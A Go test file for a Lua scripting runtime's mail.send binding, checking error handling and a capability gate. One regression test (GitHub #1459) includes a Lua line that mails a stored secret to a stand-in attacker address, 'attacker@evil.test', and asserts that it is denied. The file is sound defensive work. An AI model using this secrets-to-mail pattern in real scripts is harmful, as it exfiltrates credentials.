package lua

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// recordingMailSender captures what mail.send handed it, and can be made to
// fail. A local double rather than an import of internal/mail — this package
// declares MailSender at its own call site and must be testable without it.
type recordingMailSender struct {
	mu   sync.Mutex
	sent []MailMessage
	err  error
}

func (s *recordingMailSender) SendMail(_ context.Context, msg MailMessage) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.err != nil {
		return s.err
	}
	s.sent = append(s.sent, msg)
	return nil
}

func (s *recordingMailSender) messages() []MailMessage {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]MailMessage, len(s.sent))
	copy(out, s.sent)
	return out
}

// newMailRuntime builds a reader runtime with the given sender wired and the
// `mail` capability GRANTED.
//
// Granted by default because these tests are about the binding's behaviour
// once a script is authorized — error classification, argument handling,
// feature detection — and a runtime that refuses everything would test the
// gate over and over instead. The gate has its own tests, which build their
// runtimes explicitly rather than through this helper precisely so that
// changing this default cannot make them pass vacuously.
func newMailRuntime(t *testing.T, sender MailSender) (*Runtime, *strings.Builder) {
	t.Helper()
	var sb strings.Builder
	opts := []Option{WithCapabilities(Capabilities{Mail: true})}
	if sender != nil {
		opts = append(opts, WithMailSender(sender))
	}
	rt := NewReader(ReadDeps{}, &sb, opts...)
	t.Cleanup(rt.Close)
	return rt, &sb
}

// TestMailSend_Succeeds covers AC8's positive half.
func TestMailSend_Succeeds(t *testing.T) {
	t.Parallel()

	sender := &recordingMailSender{}
	rt, _ := newMailRuntime(t, sender)

	require.NoError(t, rt.RunString(`
local ok, err = mail.send{
  to = "a@example.com",
  subject = "Hello",
  html = "<p>hi</p>",
  text = "hi",
}
assert(err == nil, "unexpected error")
assert(ok == true, "expected true on success")`))

	got := sender.messages()
	require.Len(t, got, 1)
	assert.Equal(t, []string{"a@example.com"}, got[0].To)
	assert.Equal(t, "Hello", got[0].Subject)
	assert.Equal(t, "<p>hi</p>", got[0].HTML)
	assert.Equal(t, "hi", got[0].Text)
}

// TestMailSend_MultipleRecipients pins the array shape of `to`.
func TestMailSend_MultipleRecipients(t *testing.T) {
	t.Parallel()

	sender := &recordingMailSender{}
	rt, _ := newMailRuntime(t, sender)

	require.NoError(t, rt.RunString(`
local ok, err = mail.send{
  to = {"a@example.com", "b@example.com"},
  subject = "S",
  text = "t",
}
assert(err == nil)
assert(ok == true)`))

	got := sender.messages()
	require.Len(t, got, 1)
	assert.Equal(t, []string{"a@example.com", "b@example.com"}, got[0].To)
}

// TestMailSend_RegisteredWithoutSender covers AC8's negative half AND the
// feature-detection contract: the binding is PRESENT even with no mail
// configured, and reports a typed not_configured error.
//
// Present-and-erroring rather than absent, because "mail is off for this
// project" is a fact about configuration, not a capability the script was
// denied — and "attempt to call a nil value" tells an operator nothing about
// mail. The failure is loud either way; this makes it informative.
func TestMailSend_RegisteredWithoutSender(t *testing.T) {
	t.Parallel()

	rt, buf := newMailRuntime(t, nil)

	require.NoError(t, rt.RunString(`
assert(type(mail) == "table", "mail global must exist even when unconfigured")
assert(type(mail.send) == "function", "mail.send must exist for feature detection")

local ok, err = mail.send{to = "a@example.com", subject = "S", text = "t"}
assert(ok == nil, "unconfigured send must not report success")
rela.output(err.kind .. "|" .. err.message)`))

	var got string
	require.NoError(t, json.Unmarshal([]byte(buf.String()), &got))
	assert.True(t, strings.HasPrefix(got, "not_configured|"), "got %q", got)
	assert.Contains(t, got, "not configured")
}

// TestMailSend_DeliveryFailureIsErrTable is the convention clause: delivery is
// network-bound, so a failure returns (nil, err_table) and NEVER raises. A
// raise would lose a whole script run because a mail server was rebooting.
func TestMailSend_DeliveryFailureIsErrTable(t *testing.T) {
	t.Parallel()

	sender := &recordingMailSender{err: errors.New("connection refused")}
	rt, buf := newMailRuntime(t, sender)

	// No pcall: if the binding raised, RunString would return an error and
	// this would fail — which is precisely the regression being pinned.
	require.NoError(t, rt.RunString(`
local ok, err = mail.send{to = "a@example.com", subject = "S", text = "t"}
assert(ok == nil, "a failed send must not report success")
assert(type(err) == "table", "error must be a table")
assert(type(err.kind) == "string")
assert(type(err.message) == "string")
assert(err.retry_after == 0, "retry_after present for ai/http shape parity")
rela.output(err.kind .. "|" .. err.message)`))

	var got string
	require.NoError(t, json.Unmarshal([]byte(buf.String()), &got))
	assert.Equal(t, "delivery_failed|connection refused", got)
}

// TestMailSend_ScriptContinuesAfterFailure is the consequence of the clause
// above, stated as behavior rather than as shape: a script can handle a
// delivery failure and carry on.
func TestMailSend_ScriptContinuesAfterFailure(t *testing.T) {
	t.Parallel()

	sender := &recordingMailSender{err: errors.New("smtp down")}
	rt, buf := newMailRuntime(t, sender)

	require.NoError(t, rt.RunString(`
local ok, err = mail.send{to = "a@example.com", subject = "S", text = "t"}
if not ok then
  rela.output("handled: " .. err.kind)
end`))

	var got string
	require.NoError(t, json.Unmarshal([]byte(buf.String()), &got))
	assert.Equal(t, "handled: delivery_failed", got)
}

// TestMailSend_ArgumentErrorsRaise pins the other side of the convention: a
// malformed call is a bug in the script, which no retry fixes, so it raises.
func TestMailSend_ArgumentErrorsRaise(t *testing.T) {
	t.Parallel()

	for name, tc := range map[string]struct{ script, want string }{
		"missing to": {
			script: `mail.send{subject = "S", text = "t"}`,
			want:   "to must be a string or an array of strings",
		},
		"empty to": {
			script: `mail.send{to = "", subject = "S", text = "t"}`,
			want:   "to must not be empty",
		},
		"empty to array": {
			script: `mail.send{to = {}, subject = "S", text = "t"}`,
			want:   "at least one address",
		},
		"non-string in to": {
			script: `mail.send{to = {"a@example.com", 42}, subject = "S", text = "t"}`,
			want:   "to[2] must be a non-empty string",
		},
		"missing subject": {
			script: `mail.send{to = "a@example.com", text = "t"}`,
			want:   "subject must be a string",
		},
		"numeric html": {
			script: `mail.send{to = "a@example.com", subject = "S", html = 5}`,
			want:   "html must be a string",
		},
		"numeric text": {
			script: `mail.send{to = "a@example.com", subject = "S", text = 5}`,
			want:   "text must be a string",
		},
	} {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			sender := &recordingMailSender{}
			rt, _ := newMailRuntime(t, sender)
			err := rt.RunString(tc.script)
			require.Error(t, err, "a malformed call must raise")
			assert.Contains(t, err.Error(), tc.want)
			assert.Empty(t, sender.messages(), "a rejected call must not send")
		})
	}
}

// TestMailSend_TimeoutClassification pins that a cancelled context is reported
// as `timeout` rather than bucketed with ordinary delivery failures — the
// distinction a script needs to decide whether retrying is worth anything.
func TestMailSend_TimeoutClassification(t *testing.T) {
	t.Parallel()

	sender := &recordingMailSender{err: context.DeadlineExceeded}
	rt, buf := newMailRuntime(t, sender)

	require.NoError(t, rt.RunString(`
local ok, err = mail.send{to = "a@example.com", subject = "S", text = "t"}
assert(ok == nil)
rela.output(err.kind)`))

	var got string
	require.NoError(t, json.Unmarshal([]byte(buf.String()), &got))
	assert.Equal(t, "timeout", got)
}

// TestMailSend_DeniedWithoutCapability pins the gate (TKT-JVHSOZ): mail.send
// requires [Capabilities.Mail], and without it the call refuses and the sender
// sees NOTHING.
//
// It also pins the half of the old contract that survives — the binding is
// still THERE. Both properties in one test on purpose: they are easy to
// satisfy individually and the design is the conjunction. A gate implemented
// by dropping the binding would pass "nothing was sent" while breaking feature
// detection, and this test would catch it.
//
// (This replaces TestMailSend_NoCapabilityNeeded, which asserted the defect.)
func TestMailSend_DeniedWithoutCapability(t *testing.T) {
	t.Parallel()

	sender := &recordingMailSender{}
	var sb strings.Builder
	rt := NewReader(ReadDeps{}, &sb, WithMailSender(sender))
	t.Cleanup(rt.Close)

	require.NoError(t, rt.RunString(`
assert(http == nil, "http must be absent without its capability")
assert(ai == nil, "ai must be absent without its capability")

-- The binding survives the denial: gating mail.send does NOT mean removing it.
assert(type(mail) == "table", "mail global must exist without the grant")
assert(type(mail.send) == "function", "mail.send must exist for feature detection")

local ok, err = mail.send{to = "attacker@evil.test", subject = "S", text = "t"}
assert(ok == nil, "an ungranted send must not report success")
rela.output(err.kind .. "|" .. err.message)`))

	assert.Empty(t, sender.messages(), "an ungranted send must not reach the transport")

	var got string
	require.NoError(t, json.Unmarshal([]byte(sb.String()), &got))
	assert.True(t, strings.HasPrefix(got, "denied|"), "got %q", got)
	// The message must name the fix. An operator who reads only this line
	// should know which key to add and where.
	assert.Contains(t, got, "mail: true")
	assert.Contains(t, got, "capabilities:")
}

// TestMailSend_SendsWithCapability is the positive half of the gate, and it
// exists separately from the tests that use newMailRuntime so that the gate is
// pinned by a runtime whose grant is visible right here.
//
// Without this, a gate that denied unconditionally would still pass
// TestMailSend_DeniedWithoutCapability — which is the specific way a
// security check gets shipped broken.
func TestMailSend_SendsWithCapability(t *testing.T) {
	t.Parallel()

	sender := &recordingMailSender{}
	rt := NewReader(ReadDeps{}, &bytes.Buffer{},
		WithMailSender(sender),
		WithCapabilities(Capabilities{Mail: true}))
	t.Cleanup(rt.Close)

	require.NoError(t, rt.RunString(`
local ok, err = mail.send{to = "a@example.com", subject = "S", text = "t"}
assert(err == nil, "a granted send must not report an error")
assert(ok == true)`))

	require.Len(t, sender.messages(), 1)
	assert.Equal(t, []string{"a@example.com"}, sender.messages()[0].To)
}

// TestMailSend_SecretsExfiltrationIsDenied is the reported vulnerability,
// inverted into a regression test (GitHub #1459).
//
// The exact scenario: a runtime holding a `secrets` grant and NO outbound
// capability at all. Before the gate, mail.send was the one unguarded outbound
// primitive, so pairing it with rela.secrets exfiltrated a credential to an
// attacker-chosen address without needing any privilege the script did not
// already have.
//
// The script asserts the secret is readable before attempting to send. That
// matters: without it, a future change that broke the secrets grant would make
// this test pass for entirely the wrong reason — nothing leaked because there
// was nothing to leak — and quietly stop testing the gate.
func TestMailSend_SecretsExfiltrationIsDenied(t *testing.T) {
	t.Parallel()

	sender := &recordingMailSender{}
	rt := NewReader(ReadDeps{}, &bytes.Buffer{},
		WithMailSender(sender),
		WithSecrets(map[string]string{"smtp_password": "hunter2"}),
		WithCapabilities(Capabilities{Secrets: []string{"smtp_password"}}))
	t.Cleanup(rt.Close)

	require.NoError(t, rt.RunString(`
assert(http == nil, "no http capability")
assert(ai == nil, "no ai capability")
assert(rela.secrets.smtp_password == "hunter2", "the secret must be readable, or this test proves nothing")

local ok, err = mail.send{
  to = "attacker@evil.test", subject = "x", text = rela.secrets.smtp_password}
assert(ok == nil)
assert(err.kind == "denied", "expected denied, got " .. tostring(err.kind))`))

	assert.Empty(t, sender.messages(), "the secret must not have reached any transport")
}

// TestMailSend_DeniedOutranksNotConfigured pins the ORDER of the two refusals.
//
// With neither the grant nor a sender, the answer is `denied`, not
// `not_configured`. Two reasons, and the second is the practical one: a script
// that was never authorized to send should not learn whether the deployment has
// mail set up, and an operator chasing a denial should be sent to the
// `capabilities:` block rather than to a mail.yaml that is perfectly fine.
func TestMailSend_DeniedOutranksNotConfigured(t *testing.T) {
	t.Parallel()

	var sb strings.Builder
	rt := NewReader(ReadDeps{}, &sb) // no sender, no capability
	t.Cleanup(rt.Close)

	require.NoError(t, rt.RunString(`
local ok, err = mail.send{to = "a@example.com", subject = "S", text = "t"}
assert(ok == nil)
rela.output(err.kind)`))

	var got string
	require.NoError(t, json.Unmarshal([]byte(sb.String()), &got))
	assert.Equal(t, "denied", got,
		"an unauthorized caller must not be told whether mail is configured")
}

// TestMailSend_DeniedBeforeArgumentParsing pins that the gate runs ahead of
// argument validation.
//
// A malformed call normally RAISES. If the grant were checked after parsing,
// an ungranted script could tell a valid message from an invalid one by
// whether the call blew up — a side channel, and a small one, but the fix is
// free: check authorization first and every ungranted call looks identical.
func TestMailSend_DeniedBeforeArgumentParsing(t *testing.T) {
	t.Parallel()

	var sb strings.Builder
	rt := NewReader(ReadDeps{}, &sb, WithMailSender(&recordingMailSender{}))
	t.Cleanup(rt.Close)

	// `to` is missing entirely, which a granted runtime would raise on.
	require.NoError(t, rt.RunString(`
local ok, err = mail.send{subject = "S"}
assert(ok == nil)
rela.output(err.kind)`))

	var got string
	require.NoError(t, json.Unmarshal([]byte(sb.String()), &got))
	assert.Equal(t, "denied", got)
}

// TestMailSend_OnWriterRuntime pins that the binding is registered on writer
// runtimes too — automations are the main consumer, and they are writers.
func TestMailSend_OnWriterRuntime(t *testing.T) {
	t.Parallel()

	sender := &recordingMailSender{}
	rt := NewWriter(WriteDeps{EntityManager: &recordingMutator{}}, &bytes.Buffer{},
		WithMailSender(sender),
		WithCapabilities(Capabilities{Mail: true}))
	t.Cleanup(rt.Close)

	require.NoError(t, rt.RunString(`
local ok, err = mail.send{to = "a@example.com", subject = "S", text = "t"}
assert(err == nil)
assert(ok == true)`))

	assert.Len(t, sender.messages(), 1)
}
